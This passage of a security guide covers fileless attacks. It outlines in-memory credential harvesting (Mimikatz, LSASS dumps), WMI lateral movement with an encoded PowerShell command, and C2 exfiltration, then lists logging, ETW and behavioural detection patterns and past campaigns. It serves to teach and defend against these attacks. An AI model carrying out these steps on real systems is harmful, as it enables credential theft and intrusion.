  -> OR: In-memory SharpUp for local privesc checks
  NO FILES ON DISK

PHASE 5: CREDENTIAL HARVESTING
================================
Method: BOF for LSASS minidump + in-memory parsing
  -> Or: In-memory Mimikatz via execute-assembly
  -> Credentials stored in Beacon's memory
  NO FILES ON DISK

PHASE 6: LATERAL MOVEMENT
===========================
Method: WMI + PowerShell download cradle
  -> wmic /node:TARGET process call create "powershell -enc ..."
  -> New target downloads and executes shellcode in-memory
  -> New Beacon deployed via reflective injection
  NO FILES ON DISK

PHASE 7: DATA COLLECTION & EXFILTRATION
=========================================
Method: In-memory data collection
  -> BOFs for file searching and reading
  -> Data compressed and encrypted in memory
  -> Exfiltrated over C2 channel (HTTPS)
  NO FILES ON DISK
OPSEC Advantages and Limitations
What Fileless Buys You
ADVANTAGES:
============
1. Evades file-based AV scanning (no file to scan)
2. Evades application whitelisting (using trusted LOLBins)
3. Reduces disk forensic artifacts (no PE files, no file hashes)
4. Survives standard incident response file sweeps
5. No file hashes for threat intel matching
6. Reduced ShimCache/AmCache/Prefetch entries for custom tools

LIMITATIONS (WHAT FILELESS DOES NOT SOLVE):
=============================================
1. Process creation is still logged (Event 4688, Sysmon 1)
2. PowerShell ScriptBlock Logging captures decoded scripts
3. ETW captures .NET assembly loads, API calls
4. Network traffic is still visible (NDR, proxy logs)
5. Memory is still scannable (EDR, memory forensics)
6. WMI subscriptions are logged (Sysmon 19/20/21)
7. Command-line arguments are logged (even for LOLBins)
8. Parent-child process relationships are suspicious
   (winword.exe -> powershell.exe -> rundll32.exe)
9. Named pipes for C2 are enumerable
10. AMSI scans PowerShell content regardless of origin
Detection Mechanisms
PowerShell Logging
POWERSHELL LOGGING (Primary fileless detection):
=================================================

1. Script Block Logging (Event 4104):
   - Logs the DEOBFUSCATED content of every script block executed
   - Captures downloaded-and-executed content
   - Even encoded/obfuscated scripts are logged AFTER deobfuscation
   - Location: Microsoft-Windows-PowerShell/Operational
   - This is the #1 detection for PowerShell-based fileless attacks

2. Module Logging (Event 4103):
   - Logs pipeline execution details
   - Captures cmdlet names, parameters, output
   - Less detailed than ScriptBlock but broader coverage

3. Transcription:
   - Full text recording of PowerShell sessions
   - Captures input and output
   - Saved to configured directory (often missed by attackers)
   - Location: Configured via GPO or registry

4. Constrained Language Mode (Prevention):
   - Restricts PowerShell capabilities
   - Blocks .NET access, COM objects, Add-Type
   - Significantly limits fileless PowerShell techniques
ETW-Based Detection
ETW PROVIDERS FOR FILELESS DETECTION:
========================================

Microsoft-Windows-DotNETRuntime:
  - AssemblyLoad events (detect in-memory .NET loading)
  - JIT compilation events
  - AppDomain creation
  - Method JIT compilation (what code is being compiled)

Microsoft-Windows-PowerShell:
  - Script block execution
  - Provider lifecycle

Microsoft-Windows-WMI-Activity:
  - WMI query execution
  - WMI event subscription creation
  - WMI method invocation

Microsoft-Windows-Threat-Intelligence:
  - VirtualAlloc with EXECUTE permissions
  - Remote memory operations (WriteProcessMemory)
  - APC queueing (thread injection)
  - Requires PPL (Protected Process Light) to consume

DETECTION LOGIC:
  IF: Non-.NET process loads clr.dll
  AND: Assembly.Load called with byte array
  AND: No corresponding file on disk
  THEN: High confidence in-memory .NET execution (fileless)
Behavioral Detection
BEHAVIORAL INDICATORS:
========================

1. PROCESS CHAIN ANOMALIES:
   winword.exe -> cmd.exe -> powershell.exe     (macro execution)
   mshta.exe -> powershell.exe                  (HTA fileless)
   wmic.exe -> powershell.exe                   (WMI fileless)
   rundll32.exe -> powershell.exe               (LOLBin chain)

2. ENCODED COMMAND DETECTION:
   powershell.exe -enc <long_base64_string>
   powershell.exe -e <long_base64_string>
   Any -EncodedCommand with significant length

3. DOWNLOAD CRADLE PATTERNS:
   Process command line containing:
   - "IEX" or "Invoke-Expression"
   - "Net.WebClient" or "DownloadString"
   - "Invoke-WebRequest" or "IWR"
   - "WinHttp.WinHttpRequest"

4. LOLBin MISUSE:
   certutil.exe with -urlcache
   mshta.exe with http:// or javascript:
   regsvr32.exe with /i:http://
   msbuild.exe from unexpected directory
Real-World Campaigns
Notable Fileless Campaigns
OPERATION COBALT KITTY (APT32/OceanLotus - 2017):
  - PowerShell download cradles for initial access
  - WMI event subscriptions for persistence
  - Registry-stored encoded payloads
  - Entire attack chain was fileless after initial macro

ASTAROTH CAMPAIGN (2019):
  - Used BITSAdmin for download (LOLBin)
  - ExtExport.exe for DLL side-loading (LOLBin)
  - Payload stored in ADS of legitimate files
  - WMI for persistence
  - Minimal file footprint

POWERGHOST CRYPTOMINER (2018):
  - Fileless cryptocurrency miner
  - Spread via EternalBlue + WMI
  - Payload stored in WMI repository
  - No miner executable on disk
  - PowerShell for all operations

FIN7/CARBANAK (Multiple campaigns):
  - Macro -> PowerShell -> reflective DLL injection
  - Cobalt Strike Beacon loaded entirely in memory
  - WMI for lateral movement
  - Registry for payload storage

TURLA (2019 - PowerShell-based operations):
  - PowerShell scripts hosted on compromised websites
  - Download cradles with heavy obfuscation
  - .NET assemblies loaded in-memory
  - WMI event subscriptions for persistence
